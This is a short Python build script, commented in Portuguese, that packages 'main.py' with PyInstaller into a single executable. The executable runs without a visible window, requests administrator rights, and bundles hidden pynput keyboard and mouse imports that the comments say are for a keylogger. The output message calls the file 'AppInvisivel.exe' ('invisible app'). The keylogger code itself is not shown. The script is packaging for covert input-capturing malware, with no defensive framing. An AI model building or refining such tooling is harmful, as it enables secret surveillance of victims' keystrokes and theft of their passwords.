import subprocess
import os

def compile_main():
    try:
        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
    except subprocess.CalledProcessError:
        print("PyInstaller não está instalado. Instalando...")
        subprocess.run(["pip", "install", "pyinstaller"], check=True)

    command = ["pyinstaller", "--onefile", "--noconsole", "--name=Build", "main.py"]

    command.extend([
        "--windowed",  # msm q no console, só que mais uma validação
        "--uac-admin",  #req admin privlgs
        "--hidden-import=pynput.keyboard._win32",  # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
        "--hidden-import=pynput.mouse._win32",     # Importação oculta para pynput (Posteriormente Sera usado no keylogger)
    ])

    try:
        subprocess.run(command, check=True)
        print("Build criada.")
        print("O executável 'AppInvisivel.exe' foi criado na pasta 'dist'.")
    except subprocess.CalledProcessError as e:
        print(f"Erro durante a compilação: {e}")

if __name__ == "__main__":
    compile_main()